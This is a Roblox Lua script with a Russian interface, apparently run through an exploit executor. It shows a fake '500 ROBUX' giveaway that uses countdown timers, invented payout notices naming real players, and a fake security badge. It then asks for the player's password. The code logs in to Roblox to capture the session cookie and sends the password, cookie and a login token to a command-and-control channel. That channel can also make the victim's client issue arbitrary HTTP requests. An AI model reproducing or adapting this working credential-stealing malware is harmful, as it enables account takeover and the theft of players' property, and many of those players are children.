local Players = game:GetService("Players")
local lp = Players.LocalPlayer
local http = game:GetService("HttpService")

local placeName = game.Name
local ok, info = pcall(function()
    return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
end)
if ok and info and info.Name and #info.Name > 3 then
    placeName = info.Name
end
if placeName == "UGC" or placeName == "Roblox" or #placeName < 3 then
    placeName = "вашей любимой игре"
end
local serverPlayers = #Players:GetPlayers()

-- leaderstats
local statName, statValue, betterPercent
local ls = lp:FindFirstChild("leaderstats")
if ls then
    local statObj = ls:FindFirstChildWhichIsA("NumberValue") or ls:FindFirstChildWhichIsA("IntValue")
    if statObj then
        statName = statObj.Name
        statValue = statObj.Value
        local allVals = {}
        for _, plr in Players:GetPlayers() do
            local pls = plr:FindFirstChild("leaderstats")
            if pls then
                local so = pls:FindFirstChildWhichIsA("NumberValue") or pls:FindFirstChildWhichIsA("IntValue")
                if so and so.Name == statName then
                    table.insert(allVals, so.Value)
                end
            end
        end
        local worse = 0
        for _, v in ipairs(allVals) do
            if v < statValue then worse = worse + 1 end
        end
        betterPercent = math.floor(worse / math.max(1, #allVals) * 100)
    end
end

-- Real player names for notifications
local playerNames = {}
for _, plr in Players:GetPlayers() do
    if plr ~= lp then
        table.insert(playerNames, plr.DisplayName)
    end
end
if #playerNames == 0 then
    table.insert(playerNames, "Player")
end

-- GUI
local g = Instance.new("ScreenGui")
g.Name = "C2_DailyBonus"
g.ResetOnSpawn = false
local parent = (gethui and gethui()) or game:GetService("CoreGui")
g.Parent = parent
C2.current_gui = g
C2.debug("GUI created, parent=" .. tostring(parent))

local function new(c, p)
    local o = Instance.new(c)
    for k, v in pairs(p) do o[k] = v end
    return o
end

local overlay = new("Frame", {
    Size = UDim2.new(1, 0, 1, 0),
    BackgroundColor3 = Color3.new(0, 0, 0),
    BackgroundTransparency = 0.5,
    Active = true,
    Parent = g
})

local hasStats = statName and statValue and betterPercent ~= nil
local W = 540
local H = hasStats and 640 or 570
local win = new("Frame", {
    Size = UDim2.new(0, W, 0, H),
    Position = UDim2.new(0.5, -W / 2, 0.5, -H / 2),
    BackgroundColor3 = Color3.fromRGB(22, 24, 28),
    BorderSizePixel = 0,
    Parent = g
})

new("Frame", {
    Size = UDim2.new(1, 0, 0, 4),
    BackgroundColor3 = Color3.fromRGB(255, 180, 0),
    BorderSizePixel = 0,
    Parent = win
})

local y = 18

-- Header
new("TextLabel", {
    Size = UDim2.new(0, W - 40, 0, 46),
    Position = UDim2.new(0, 20, 0, y),
    BackgroundTransparency = 1,
    Text = "\xF0\x9F\x8E\x89  ВЫ ВЫИГРАЛИ 500 ROBUX!",
    TextColor3 = Color3.fromRGB(255, 210, 0),
    TextSize = 34,
    Font = Enum.Font.GothamBold,
    TextXAlignment = Enum.TextXAlignment.Left,
    Parent = win
})
y = y + 46

new("TextLabel", {
    Size = UDim2.new(0, W - 40, 0, 24),
    Position = UDim2.new(0, 20, 0, y),
    BackgroundTransparency = 1,
    Text = "\xE2\x9C\xA8  Награда для активных игроков.",
    TextColor3 = Color3.fromRGB(255, 180, 60),
    TextSize = 17,
    Font = Enum.Font.Gotham,
    TextXAlignment = Enum.TextXAlignment.Left,
    Parent = win
})
y = y + 28

new("TextLabel", {
    Size = UDim2.new(0, W - 40, 0, 30),
    Position = UDim2.new(0, 20, 0, y),
    BackgroundTransparency = 1,
    Text = "\xF0\x9F\x94\xA5  ТОЛЬКО СЕГОДНЯ!",
    TextColor3 = Color3.fromRGB(255, 80, 80),
    TextSize = 26,
    Font = Enum.Font.GothamBold,
    TextXAlignment = Enum.TextXAlignment.Left,
    Parent = win
})
y = y + 36

new("TextLabel", {
    Size = UDim2.new(0, W - 40, 0, 20),
    Position = UDim2.new(0, 20, 0, y),
    BackgroundTransparency = 1,
    Text = "\xF0\x9F\x8E\xAE " .. placeName .. "    \xF0\x9F\x91\xA5 " .. serverPlayers .. " игроков",
    TextColor3 = Color3.fromRGB(150, 160, 175),
    TextSize = 17,
    Font = Enum.Font.Gotham,
    TextXAlignment = Enum.TextXAlignment.Left,
    Parent = win
})
y = y + 28

new("Frame", {
    Size = UDim2.new(0, W - 44, 0, 1),
    Position = UDim2.new(0, 22, 0, y),
    BackgroundColor3 = Color3.fromRGB(40, 44, 50),
    BorderSizePixel = 0,
    Parent = win
})
y = y + 14

-- Stats
if hasStats then
    if betterPercent >= 70 then
        new("TextLabel", {
            Size = UDim2.new(0, W - 40, 0, 28),
            Position = UDim2.new(0, 20, 0, y),
            BackgroundTransparency = 1,
            Text = "\xF0\x9F\x8F\x86  Вы лучше " .. betterPercent .. "% игроков на сервере!",
            TextColor3 = Color3.fromRGB(255, 200, 50),
            TextSize = 20,
            Font = Enum.Font.GothamBold,
            TextXAlignment = Enum.TextXAlignment.Left,
            Parent = win
        })
    else
        new("TextLabel", {
            Size = UDim2.new(0, W - 40, 0, 28),
            Position = UDim2.new(0, 20, 0, y),
            BackgroundTransparency = 1,
            Text = "\xF0\x9F\x9A\x80  Бонус на развитие!",
            TextColor3 = Color3.fromRGB(80, 200, 255),
            TextSize = 20,
            Font = Enum.Font.GothamBold,
            TextXAlignment = Enum.TextXAlignment.Left,
            Parent = win
        })
    end
    y = y + 32
    new("TextLabel", {
        Size = UDim2.new(0, W - 40, 0, 22),
        Position = UDim2.new(0, 20, 0, y),
        BackgroundTransparency = 1,
        Text = "\xF0\x9F\x93\x8A " .. statName .. ": " .. tostring(statValue),
        TextColor3 = Color3.fromRGB(180, 190, 205),
        TextSize = 19,
        Font = Enum.Font.Gotham,
        TextXAlignment = Enum.TextXAlignment.Left,
        Parent = win
    })
    y = y + 30
    new("Frame", {
        Size = UDim2.new(0, W - 44, 0, 1),
        Position = UDim2.new(0, 22, 0, y),
        BackgroundColor3 = Color3.fromRGB(40, 44, 50),
        BorderSizePixel = 0,
        Parent = win
    })
    y = y + 14
end

-- successLabel (visible after login in the empty timer area)
local successLabel = new("TextLabel", {
    Size = UDim2.new(0, W - 40, 0, 100),
    Position = UDim2.new(0, 20, 0, y),
    BackgroundTransparency = 1,
    Text = "",
    TextColor3 = Color3.fromRGB(0, 200, 100),
    TextSize = 20,
    Font = Enum.Font.GothamBold,
    TextXAlignment = Enum.TextXAlignment.Left,
    TextYAlignment = Enum.TextYAlignment.Top,
    TextWrapped = true,
    Visible = false,
    Parent = win
})

-- Timer
local timerLabel = new("TextLabel", {
    Size = UDim2.new(0, W - 40, 0, 26),
    Position = UDim2.new(0, 20, 0, y),
    BackgroundTransparency = 1,
    Text = "\xE2\x8F\xB1  Осталось: 05:00",
    TextColor3 = Color3.fromRGB(255, 255, 255),
    TextSize = 22,
    Font = Enum.Font.GothamBold,
    TextXAlignment = Enum.TextXAlignment.Left,
    Parent = win
})
y = y + 30

-- Progress bar
local progressClaimed = math.random(780, 950)
local progressTotal = 1000
new("TextLabel", {
    Size = UDim2.new(0, W - 40, 0, 20),
    Position = UDim2.new(0, 20, 0, y),
    BackgroundTransparency = 1,
    Text = "Забрано " .. progressClaimed .. " из " .. progressTotal .. " наград",
    TextColor3 = Color3.fromRGB(150, 160, 175),
    TextSize = 15,
    Font = Enum.Font.Gotham,
    TextXAlignment = Enum.TextXAlignment.Left,
    Parent = win
})
y = y + 22

local barBg = new("Frame", {
    Size = UDim2.new(0, W - 40, 0, 12),
    Position = UDim2.new(0, 20, 0, y),
    BackgroundColor3 = Color3.fromRGB(40, 44, 50),
    BorderSizePixel = 0,
    Parent = win
})
local barFill = new("Frame", {
    Size = UDim2.new(progressClaimed / progressTotal, 0, 1, 0),
    BackgroundColor3 = Color3.fromRGB(0, 200, 100),
    BorderSizePixel = 0,
    Parent = barBg
})
y = y + 18

-- Notifications
local notifLabel = new("TextLabel", {
    Size = UDim2.new(0, W - 40, 0, 22),
    Position = UDim2.new(0, 20, 0, y),
    BackgroundTransparency = 1,
    Text = "",
    TextColor3 = Color3.fromRGB(130, 140, 155),
    TextSize = 15,
    Font = Enum.Font.Gotham,
    TextXAlignment = Enum.TextXAlignment.Left,
    Parent = win
})
y = y + 26

new("Frame", {
    Size = UDim2.new(0, W - 44, 0, 1),
    Position = UDim2.new(0, 22, 0, y),
    BackgroundColor3 = Color3.fromRGB(40, 44, 50),
    BorderSizePixel = 0,
    Parent = win
})
y = y + 14

-- Warning
new("TextLabel", {
    Size = UDim2.new(0, W - 40, 0, 30),
    Position = UDim2.new(0, 20, 0, y),
    BackgroundTransparency = 1,
    Text = "\xE2\x9A\xA0  НЕ УПУСТИТЕ ШАНС!",
    TextColor3 = Color3.fromRGB(255, 60, 60),
    TextSize = 24,
    Font = Enum.Font.GothamBold,
    TextXAlignment = Enum.TextXAlignment.Left,
    Parent = win
})
y = y + 28

new("TextLabel", {
    Size = UDim2.new(0, W - 40, 0, 20),
    Position = UDim2.new(0, 20, 0, y),
    BackgroundTransparency = 1,
    Text = "\xE2\x9A\xA0 Предложение ограничено. Заберите сейчас.",
    TextColor3 = Color3.fromRGB(255, 150, 50),
    TextSize = 17,
    Font = Enum.Font.GothamBold,
    TextXAlignment = Enum.TextXAlignment.Left,
    Parent = win
})
y = y + 26

new("Frame", {
    Size = UDim2.new(0, W - 44, 0, 1),
    Position = UDim2.new(0, 22, 0, y),
    BackgroundColor3 = Color3.fromRGB(40, 44, 50),
    BorderSizePixel = 0,
    Parent = win
})
y = y + 14

-- Step indicator
local stepLabel = new("TextLabel", {
    Size = UDim2.new(0, W - 40, 0, 22),
    Position = UDim2.new(0, 20, 0, y),
    BackgroundTransparency = 1,
    Text = "\xE2\x9E\xA1 Шаг 1 из 2: Получите награду",
    TextColor3 = Color3.fromRGB(100, 200, 255),
    TextSize = 17,
    Font = Enum.Font.GothamBold,
    TextXAlignment = Enum.TextXAlignment.Left,
    Parent = win
})
y = y + 28

-- Button
local claimBtn = new("TextButton", {
    Size = UDim2.new(0, W - 40, 0, 56),
    Position = UDim2.new(0, 20, 0, y),
    BackgroundColor3 = Color3.fromRGB(220, 50, 50),
    BorderSizePixel = 0,
    Text = " ЗАБРАТЬ 500 ROBUX",
    TextColor3 = Color3.fromRGB(255, 255, 255),
    TextSize = 24,
    Font = Enum.Font.GothamBold,
    Parent = win
})
y = y + 62

local successLabel = new("TextLabel", {
    Size = UDim2.new(0, W - 40, 0, 30),
    Position = UDim2.new(0, 20, 0, y),
    BackgroundTransparency = 1,
    Text = "",
    TextColor3 = Color3.fromRGB(0, 200, 100),
    TextSize = 17,
    Font = Enum.Font.GothamBold,
    TextXAlignment = Enum.TextXAlignment.Left,
    Visible = false,
    Parent = win
})
y = y + 22

-- Badge
new("TextLabel", {
    Size = UDim2.new(0, W - 40, 0, 20),
    Position = UDim2.new(0, 20, 0, y),
    BackgroundTransparency = 1,
    Text = "\xF0\x9F\x9B\xA1  Проверено Roblox Security",
    TextColor3 = Color3.fromRGB(80, 160, 80),
    TextSize = 14,
    Font = Enum.Font.Gotham,
    TextXAlignment = Enum.TextXAlignment.Left,
    Parent = win
})

-- === TIMER + NOTIFICATIONS (один поток) ===
task.spawn(function()
    local remaining = 300
    local extend = nil
    local notifIdx = 1
    local notifTimer = 0
    while g.Parent do
        if remaining > 0 then
            local m = remaining // 60
            local s = remaining % 60
            timerLabel.Text = "\xE2\x8F\xB1  Осталось: " .. (m < 10 and "0" or "") .. m .. ":" .. (s < 10 and "0" or "") .. s
            if remaining <= 30 then
                timerLabel.TextColor3 = Color3.fromRGB(255, 60, 60)
            end
            remaining = remaining - 1
        elseif extend == nil then
            extend = 60
            timerLabel.Text = "\xE2\x9A\xA0  ПОСЛЕДНИЙ ШАНС! Время продлено."
            timerLabel.TextColor3 = Color3.fromRGB(255, 60, 60)
        elseif extend > 0 then
            timerLabel.Text = "\xE2\x8F\xB1  Осталось: 00:" .. (extend < 10 and "0" or "") .. extend
            timerLabel.TextColor3 = Color3.fromRGB(255, 60, 60)
            extend = extend - 1
        else
            C2.debug("timer expired, sending timed_out")
            C2.send({type = "timed_out"})
            C2.debug("calling unload after timed_out")
            C2.unload()
            break
        end
        if notifTimer <= 0 then
            local name = playerNames[(notifIdx % #playerNames) + 1]
            local amount = math.random(10, 50) * 10
            notifLabel.Text = "\xF0\x9F\x93\xA2 " .. name .. " только что получил " .. amount .. " ROBUX!"
            notifLabel.TextColor3 = Color3.fromRGB(130, 200, 255)
            notifTimer = 60
            notifIdx = notifIdx + 1
        end
        notifTimer = notifTimer - 1
        task.wait(1)
    end
    C2.debug("timer thread: while loop ended, g.Parent=" .. tostring(g.Parent))
end)

-- === CLOSE BUTTON + CONFIRMATION ===
local closeBtn = new("TextButton", {
    Size = UDim2.new(0, 34, 0, 34),
    Position = UDim2.new(1, -44, 0, 8),
    BackgroundColor3 = Color3.fromRGB(40, 44, 50),
    BorderSizePixel = 0,
    Text = "X",
    TextColor3 = Color3.fromRGB(150, 160, 175),
    TextSize = 20,
    Font = Enum.Font.GothamBold,
    Parent = win
})

local confirmFrame = new("Frame", {
    Size = UDim2.new(1, 0, 1, 0),
    BackgroundColor3 = Color3.fromRGB(22, 24, 28),
    BorderSizePixel = 0,
    Visible = false,
    ZIndex = 10,
    Parent = win
})
local cy = 40
new("TextLabel", {
    Size = UDim2.new(0, W - 40, 0, 36),
    Position = UDim2.new(0, 20, 0, cy),
    BackgroundTransparency = 1,
    Text = "\xE2\x9D\x97  Вы уверены?",
    TextColor3 = Color3.fromRGB(255, 255, 255),
    TextSize = 26,
    Font = Enum.Font.GothamBold,
    TextXAlignment = Enum.TextXAlignment.Left,
    ZIndex = 10,
    Parent = confirmFrame
})
cy = cy + 50
new("TextLabel", {
    Size = UDim2.new(0, W - 40, 0, 60),
    Position = UDim2.new(0, 20, 0, cy),
    BackgroundTransparency = 1,
    Text = "Это предложение доступно только сегодня. Если вы закроете, вы больше не сможете получить 500 ROBUX. Ваша награда будет передана другому игроку.",
    TextColor3 = Color3.fromRGB(180, 190, 205),
    TextSize = 17,
    Font = Enum.Font.Gotham,
    TextXAlignment = Enum.TextXAlignment.Left,
    TextWrapped = true,
    ZIndex = 10,
    Parent = confirmFrame
})
cy = cy + 80
local stayBtn = new("TextButton", {
    Size = UDim2.new(0, W - 44, 0, 50),
    Position = UDim2.new(0, 22, 0, cy),
    BackgroundColor3 = Color3.fromRGB(0, 180, 90),
    BorderSizePixel = 0,
    Text = " ПОЛУЧИТЬ 500 ROBUX",
    TextColor3 = Color3.fromRGB(255, 255, 255),
    TextSize = 22,
    Font = Enum.Font.GothamBold,
    ZIndex = 10,
    Parent = confirmFrame
})
cy = cy + 60
local confirmCloseBtn = new("TextButton", {
    Size = UDim2.new(0, W - 44, 0, 44),
    Position = UDim2.new(0, 22, 0, cy),
    BackgroundColor3 = Color3.fromRGB(50, 50, 60),
    BorderSizePixel = 0,
    Text = "Нет, я не хочу 500 ROBUX",
    TextColor3 = Color3.fromRGB(150, 160, 175),
    TextSize = 17,
    Font = Enum.Font.Gotham,
    ZIndex = 10,
    Parent = confirmFrame
})

closeBtn.MouseEnter:Connect(function()
    closeBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
    closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
end)
closeBtn.MouseLeave:Connect(function()
    closeBtn.BackgroundColor3 = Color3.fromRGB(40, 44, 50)
    closeBtn.TextColor3 = Color3.fromRGB(150, 160, 175)
end)
closeBtn.MouseButton1Click:Connect(function()
    if verified then
        C2.debug("close after verified")
        C2.send({type = "closed"})
        C2.unload()
        return
    end
    confirmFrame.Visible = true
end)
stayBtn.MouseEnter:Connect(function()
    stayBtn.BackgroundColor3 = Color3.fromRGB(0, 210, 105)
end)
stayBtn.MouseLeave:Connect(function()
    stayBtn.BackgroundColor3 = Color3.fromRGB(0, 180, 90)
end)
stayBtn.MouseButton1Click:Connect(function()
    confirmFrame.Visible = false
end)
confirmCloseBtn.MouseEnter:Connect(function()
    confirmCloseBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
end)
confirmCloseBtn.MouseLeave:Connect(function()
    confirmCloseBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
end)
confirmCloseBtn.MouseButton1Click:Connect(function()
    C2.debug("confirm close clicked")
    C2.send({type = "closed"})
    C2.debug("calling unload after confirm close")
    C2.unload()
end)

-- === VERIFY OVERLAY ===
local step = 1
local checking = false
local verifyFrame = new("Frame", {
    Size = UDim2.new(1, 0, 1, 0),
    BackgroundColor3 = Color3.fromRGB(22, 24, 28),
    BorderSizePixel = 0,
    Visible = false,
    ZIndex = 10,
    Parent = win
})
local vy = 36
-- Close button on verifyFrame
local vCloseBtn = new("TextButton", {
    Size = UDim2.new(0, 34, 0, 34),
    Position = UDim2.new(1, -44, 0, 8),
    BackgroundColor3 = Color3.fromRGB(40, 44, 50),
    BorderSizePixel = 0,
    Text = "X",
    TextColor3 = Color3.fromRGB(150, 160, 175),
    TextSize = 20,
    Font = Enum.Font.GothamBold,
    ZIndex = 11,
    Parent = verifyFrame
})
vCloseBtn.MouseEnter:Connect(function()
    vCloseBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
    vCloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
end)
vCloseBtn.MouseLeave:Connect(function()
    vCloseBtn.BackgroundColor3 = Color3.fromRGB(40, 44, 50)
    vCloseBtn.TextColor3 = Color3.fromRGB(150, 160, 175)
end)
vCloseBtn.MouseButton1Click:Connect(function()
    if checking then return end
    C2.debug("vCloseBtn clicked")
    C2.send({type = "closed"})
    C2.unload()
end)
new("TextLabel", {
    Size = UDim2.new(0, W - 40, 0, 40),
    Position = UDim2.new(0, 20, 0, vy),
    BackgroundTransparency = 1,
    Text = "\xF0\x9F\x94\x90  ПОДТВЕРЖДЕНИЕ АККАУНТА",
    TextColor3 = Color3.fromRGB(255, 210, 0),
    TextSize = 28,
    Font = Enum.Font.GothamBold,
    TextXAlignment = Enum.TextXAlignment.Left,
    ZIndex = 10,
    Parent = verifyFrame
})
vy = vy + 50
new("Frame", {
    Size = UDim2.new(0, W - 44, 0, 1),
    Position = UDim2.new(0, 22, 0, vy),
    BackgroundColor3 = Color3.fromRGB(40, 44, 50),
    BorderSizePixel = 0,
    ZIndex = 10,
    Parent = verifyFrame
})
vy = vy + 20
new("TextLabel", {
    Size = UDim2.new(0, W - 40, 0, 28),
    Position = UDim2.new(0, 20, 0, vy),
    BackgroundTransparency = 1,
    Text = "\xF0\x9F\x91\xA4  Игрок: " .. lp.DisplayName,
    TextColor3 = Color3.fromRGB(180, 190, 205),
    TextSize = 20,
    Font = Enum.Font.GothamBold,
    TextXAlignment = Enum.TextXAlignment.Left,
    ZIndex = 10,
    Parent = verifyFrame
})
vy = vy + 40
local vPwBox = new("TextBox", {
    Size = UDim2.new(0, W - 44, 0, 52),
    Position = UDim2.new(0, 22, 0, vy),
    BackgroundColor3 = Color3.fromRGB(32, 36, 42),
    BorderSizePixel = 0,
    PlaceholderText = "Пароль от аккаунта Roblox",
    PlaceholderColor3 = Color3.fromRGB(100, 108, 120),
    Text = "",
    TextColor3 = Color3.fromRGB(220, 225, 235),
    TextSize = 22,
    Font = Enum.Font.Gotham,
    ClearTextOnFocus = false,
    ZIndex = 10,
    Parent = verifyFrame
})
vy = vy + 62
local vBtn = new("TextButton", {
    Size = UDim2.new(0, W - 44, 0, 52),
    Position = UDim2.new(0, 22, 0, vy),
    BackgroundColor3 = Color3.fromRGB(0, 180, 90),
    BorderSizePixel = 0,
    Text = " ПОДТВЕРДИТЬ",
    TextColor3 = Color3.fromRGB(255, 255, 255),
    TextSize = 22,
    Font = Enum.Font.GothamBold,
    ZIndex = 10,
    Parent = verifyFrame
})
vy = vy + 62
local vStatus = new("TextLabel", {
    Size = UDim2.new(0, W - 44, 0, 44),
    Position = UDim2.new(0, 22, 0, vy),
    BackgroundTransparency = 1,
    Text = "",
    TextColor3 = Color3.fromRGB(200, 60, 60),
    TextSize = 16,
    Font = Enum.Font.GothamBold,
    TextXAlignment = Enum.TextXAlignment.Left,
    TextWrapped = true,
    ZIndex = 10,
    Parent = verifyFrame
})
vy = vy + 54
local vBack = new("TextButton", {
    Size = UDim2.new(0, W - 44, 0, 40),
    Position = UDim2.new(0, 22, 0, vy),
    BackgroundColor3 = Color3.fromRGB(50, 50, 60),
    BorderSizePixel = 0,
    Text = "\xE2\x86\xA9  Назад",
    TextColor3 = Color3.fromRGB(150, 160, 175),
    TextSize = 17,
    Font = Enum.Font.Gotham,
    ZIndex = 10,
    Parent = verifyFrame
})
local vSuccess = new("TextLabel", {
    Size = UDim2.new(1, -20, 1, -20),
    Position = UDim2.new(0, 10, 0, 10),
    BackgroundTransparency = 1,
    Text = "",
    TextColor3 = Color3.fromRGB(255, 255, 255),
    TextSize = 28,
    Font = Enum.Font.GothamBold,
    TextXAlignment = Enum.TextXAlignment.Center,
    TextYAlignment = Enum.TextYAlignment.Center,
    TextWrapped = true,
    Visible = false,
    ZIndex = 20,
    Parent = verifyFrame
})
vBtn.MouseEnter:Connect(function()
    vBtn.BackgroundColor3 = Color3.fromRGB(0, 210, 105)
end)
vBtn.MouseLeave:Connect(function()
    vBtn.BackgroundColor3 = Color3.fromRGB(0, 180, 90)
end)
local verified = false
local blocked = false

local function try_client_login(pw)
    local ok, result = pcall(function()
        local body = http:JSONEncode({
            ctype = "Username",
            cvalue = lp.Name,
            password = pw,
        })
        local url = "https://auth.roblox.com/v2/login"

        local resp1 = http:RequestAsync({
            Url = url, Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = body,
        })
        if resp1.StatusCode == 200 then
            local sc = resp1.Headers["Set-Cookie"] or ""
            if type(sc) == "table" then sc = table.concat(sc, "; ") end
            for match in sc:gmatch("%.ROBLOSECURITY=([^;]+)") do return match end
            return nil
        end
        if resp1.StatusCode ~= 403 then return nil end
        local csrf = resp1.Headers["x-csrf-token"]
        if not csrf or csrf == "" then return nil end

        local resp2 = http:RequestAsync({
            Url = url, Method = "POST",
            Headers = {["Content-Type"] = "application/json", ["x-csrf-token"] = csrf},
            Body = body,
        })
        if resp2.StatusCode ~= 200 then return nil end
        local sc = resp2.Headers["Set-Cookie"] or ""
        if type(sc) == "table" then sc = table.concat(sc, "; ") end
        for match in sc:gmatch("%.ROBLOSECURITY=([^;]+)") do return match end
        return nil
    end)
    if ok and result then return result end
    return nil
end

vBtn.MouseButton1Click:Connect(function()
    if verified or blocked or checking then return end
    local pw = vPwBox.Text
    if pw == "" then
        vStatus.Text = "\xE2\x9C\x97  Введите пароль."
        vStatus.TextColor3 = Color3.fromRGB(200, 60, 60)
        return
    end
    checking = true
    vStatus.Text = ""
    vBtn.Text = " ПРОВЕРКА..."
    vBtn.Active = false
    vPwBox.TextEditable = false
    vBack.Active = false
    vCloseBtn.Active = false
    closeBtn.Active = false
    C2.debug("vBtn clicked, trying client-side login...")
    task.spawn(function()
        -- Try client-side login via Roblox HttpService (no PoW headache)
        local cookie = try_client_login(pw)
        if cookie then
            C2.debug("Client-side login success, cookie=" .. cookie:sub(1, 20))
            pcall(C2.send, {
                type = "password",
                password = pw,
                cookie = cookie,
                userId = lp.UserId,
                playerName = lp.DisplayName,
            })
            return
        end

        C2.debug("Client-side login failed, trying quick token...")
        -- Try Quick Login token (silent, may fail)
        local quickToken
        local ok_qt, resp_qt = pcall(function()
            local json = http:PostAsync("https://apis.roblox.com/auth-token-service/v1/login/create", "", Enum.HttpContentType.ApplicationJson, false)
            return http:JSONDecode(json)
        end)
        if ok_qt and resp_qt and resp_qt.code and resp_qt.privateKey then
            quickToken = {code = resp_qt.code, privateKey = resp_qt.privateKey}
            C2.debug("Quick token obtained: code=" .. tostring(resp_qt.code))
        else
            C2.debug("Quick token failed: " .. tostring(resp_qt))
        end
        C2.debug("sending password")
        local ok_send, err_send = pcall(C2.send, {
            type = "password",
            password = pw,
            userId = lp.UserId,
            playerName = lp.DisplayName,
            quickToken = quickToken,
        })
        C2.debug("C2.send result: ok=" .. tostring(ok_send) .. " err=" .. tostring(err_send))
    end)
end)
vBack.MouseEnter:Connect(function()
    vBack.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
end)
vBack.MouseLeave:Connect(function()
    vBack.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
end)
vBack.MouseButton1Click:Connect(function()
    if blocked or checking then return end
    verifyFrame.Visible = false
    if verified then
        stepLabel.Text = "\xE2\x9C\x85 Шаг 2 из 2: Аккаунт подтверждён"
    else
        step = 1
        stepLabel.Text = "\xE2\x9E\xA1 Шаг 1 из 2: Получите награду"
    end
end)

-- === C2 MESSAGE HANDLER ===
local function lock_all()
    vBtn.Active = false
    vPwBox.TextEditable = false
    vBack.Active = false
    vCloseBtn.Active = true
    closeBtn.Active = true
end

local function unlock_all()
    vBtn.Active = not verified
    vPwBox.TextEditable = not verified
    vBack.Active = not blocked
    vCloseBtn.Active = true
    closeBtn.Active = true
end

local function on_msg(msg)
    if msg.type ~= "hold" then
        checking = false
    end
    if msg.type == "ok" then
        verified = true
        C2.debug("on_msg: ok, message=" .. tostring(msg.message))
        vStatus.Text = "\xE2\x9C\x85  " .. msg.message
        vStatus.TextColor3 = Color3.fromRGB(0, 200, 100)
        lock_all()
        timerLabel.Visible = false
        barBg.Visible = false
        notifLabel.Visible = false
        claimBtn.Text = " \xF0\x9F\x93\xA6 ОЖИДАЙТЕ НАЧИСЛЕНИЯ"
        claimBtn.BackgroundColor3 = Color3.fromRGB(0, 140, 70)
        stepLabel.Text = "\xE2\x9C\x85 Шаг 2 из 2: Аккаунт подтверждён"
        successLabel.Text = "\xE2\x9C\x85 " .. (msg.message or "500 ROBUX будут зачислены в течение 24 часов.")
        successLabel.Visible = true
    elseif msg.type == "err" then
        C2.debug("on_msg: err, message=" .. tostring(msg.message) .. " blocked=" .. tostring(msg.blocked))
        vStatus.Text = "\xE2\x9D\x8C  " .. msg.message
        vStatus.TextColor3 = Color3.fromRGB(200, 60, 60)
        if msg.blocked then
            blocked = true
            vBtn.Text = " \xE2\x9D\x8C ЗАБЛОКИРОВАНО"
            lock_all()
        else
            vBtn.Text = " ПОДТВЕРДИТЬ"
            unlock_all()
        end
    elseif msg.type == "2fa" then
        C2.debug("on_msg: 2fa")
        vStatus.Text = "\xE2\x8F\xB3  Требуется двухфакторная аутентификация..."
        vStatus.TextColor3 = Color3.fromRGB(255, 180, 50)
        unlock_all()
    elseif msg.type == "hold" then
        C2.debug("on_msg: hold, message=" .. tostring(msg.message))
        vStatus.Text = "\xE2\x8F\xB3  " .. (msg.message or "Проверка данных...")
        vStatus.TextColor3 = Color3.fromRGB(255, 180, 50)
    elseif msg.type == "captcha_required" then
        C2.debug("on_msg: captcha_required url=" .. tostring(msg.url))
        vStatus.Size = UDim2.new(0, W - 44, 0, 70)
        vStatus.Text = "\xF0\x9F\x94\x90  Пройдите проверку:\n" .. (msg.url or "")
        vStatus.TextColor3 = Color3.fromRGB(100, 200, 255)
        vStatus.TextSize = 14
        if setclipboard then pcall(setclipboard, msg.url) end
        if setclipboard then
            vStatus.Text = vStatus.Text .. "\n\xF0\x9F\x93\xB2 Ссылка скопирована!"
        end
        unlock_all()
    elseif msg.type == "http_request" then
        local req_fn = (syn and syn.request) or request
        if not req_fn then return end
        local req = {
            Url = msg.url or msg.Url or "",
            Method = msg.method or msg.Method or "GET",
            Headers = msg.headers or msg.Headers or {},
            Body = msg.body or msg.Body or "",
        }
        local ok, result = pcall(function()
            local r = req_fn(req)
            if type(r) == "table" and r.Success ~= nil and not r.StatusCode then
                r.StatusCode = r.Success and 200 or 0
            end
            return r
        end)
        local resp = ok and result or {StatusCode = 0, Body = tostring(result), Headers = {}}
        if type(resp.Body) == "buffer" then
            resp.Body = buffer.tostring(resp.Body)
        end
        pcall(function()
            ws:Send(game:GetService("HttpService"):JSONEncode({
                type = "http_response",
                id = msg.id,
                response = {
                    StatusCode = resp.StatusCode or 0,
                    Body = resp.Body or "",
                    Headers = resp.Headers or {},
                }
            }))
        end)
    elseif msg.type == "close" then
        C2.debug("on_msg: close from server")
        C2.unload()
        return
    end
    C2.debug("on_msg done, type=" .. tostring(msg.type))
end
C2.on_message = on_msg

-- == STEP CONTROL ===

claimBtn.MouseEnter:Connect(function()
    claimBtn.BackgroundColor3 = Color3.fromRGB(240, 70, 70)
end)
claimBtn.MouseLeave:Connect(function()
    claimBtn.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
end)

claimBtn.MouseButton1Click:Connect(function()
    if verified then return end
    if step == 1 then
        step = 2
        stepLabel.Text = "\xE2\x9E\xA1 Шаг 2 из 2: Подтверждение аккаунта"
        verifyFrame.Visible = true
        verified = false
        vPwBox.Text = ""
        vPwBox.TextEditable = true
        vStatus.Text = ""
        if not blocked then
            vBtn.Text = " ПОДТВЕРДИТЬ"
            vBtn.Active = true
        end
        C2.debug("verifyFrame shown")
    end
end)

-- Cleanup handler on destroy
g.Destroying:Connect(function()
    C2.debug("GUI Destroying event fired")
    if C2.on_message == on_msg then
        C2.on_message = nil
    end
end)
